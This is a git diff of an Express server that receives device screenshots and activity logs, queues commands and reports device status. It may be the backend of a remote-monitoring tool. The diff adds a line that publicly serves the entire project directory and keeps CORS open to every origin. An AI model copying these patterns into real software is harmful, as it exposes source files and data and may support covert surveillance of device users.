@@ -2,20 +2,39 @@ const express = require("express");
 const cors = require("cors");
 const multer = require("multer");
 const fs = require("fs");
-
-const app = express();
 const path = require("path");
 
+// 🔥 GLOBAL ERROR HANDLING (CRASH PROTECTION)
+process.on("uncaughtException", (err) => {
+    console.error("❌ UNCAUGHT:", err);
+});
+process.on("unhandledRejection", (err) => {
+    console.error("❌ PROMISE ERROR:", err);
+});
+
+// 🔥 SAFE REQUIRE (NO CRASH IF NOT USED)
+try {
+    require("mongoose");
+} catch (e) {
+    console.log("Mongo not used");
+}
+
+const app = express();
+
+// 🔥 STATIC FILES (DASHBOARD FIX)
+app.use(express.static(__dirname));
+
+// ==========================
+// 📁 FOLDER SETUP
+// ==========================
 const dir = path.join(__dirname, "screenshots");
-// ==========================
-// ✅ FIX: ensure folder exists
-// ==========================
+
 if (!fs.existsSync(dir)) {
     fs.mkdirSync(dir, { recursive: true });
 }
 
 // ==========================
-// ✅ ADVANCED CORS (FIXED)
+// 🌐 CORS (FULL FIX)
 // ==========================
 app.use((req, res, next) => {
     res.header("Access-Control-Allow-Origin", "*");
@@ -26,10 +45,12 @@ app.use((req, res, next) => {
 
 app.use(cors());
 app.use(express.json({ limit: "50mb" }));
-app.use("/screenshots", express.static("screenshots"));
+
+// 🔥 FIXED STATIC PATH
+app.use("/screenshots", express.static(dir));
 
 // ==========================
-// 📸 MULTER SETUP (SAFE)
+// 📸 MULTER (SAFE)
 // ==========================
 const storage = multer.diskStorage({
     destination: function (req, file, cb) {
@@ -40,10 +61,13 @@ const storage = multer.diskStorage({
     }
 });
 
-const upload = multer({ storage: storage });
+const upload = multer({
+    storage: storage,
+    limits: { fileSize: 50 * 1024 * 1024 } // 50MB
+});
 
 // ==========================
-// 📦 STORAGE (🔥 SAFE INIT)
+// 📦 STORAGE (SAFE)
 // ==========================
 let logs = [];
 let command = "";
@@ -61,7 +85,7 @@ let deviceData = {
 };
 
 // ==========================
-// 📊 TRACK ACTIVITY (SAFE)
+// 📊 TRACK ACTIVITY
 // ==========================
 app.post("/track", upload.single("file"), (req, res) => {
     try {
@@ -91,7 +115,7 @@ app.post("/track", upload.single("file"), (req, res) => {
 // 📊 GET LOGS
 // ==========================
 app.get("/logs", (req, res) => {
-    res.json(logs); // 🔥 FIX
+    res.json(logs);
 });
 
 // ==========================
@@ -173,11 +197,11 @@ app.get("/files", (req, res) => {
 // 📤 DEVICE STATUS
 // ==========================
 app.get("/device", (req, res) => {
-    res.json(deviceData); // 🔥 FIX
+    res.json(deviceData);
 });
 
 // ==========================
-// ❤️ HEALTH
+// ❤️ HEALTH CHECK
 // ==========================
 app.get("/", (req, res) => {
     res.send("✅ Server Running");
@@ -192,7 +216,7 @@ app.use((err, req, res, next) => {
 });
 
 // ==========================
-// 🚀 START SERVER (🔥 MAIN FIX)
+// 🚀 START SERVER (RENDER FIX)
 // ==========================
 const PORT = process.env.PORT || 3000;
 
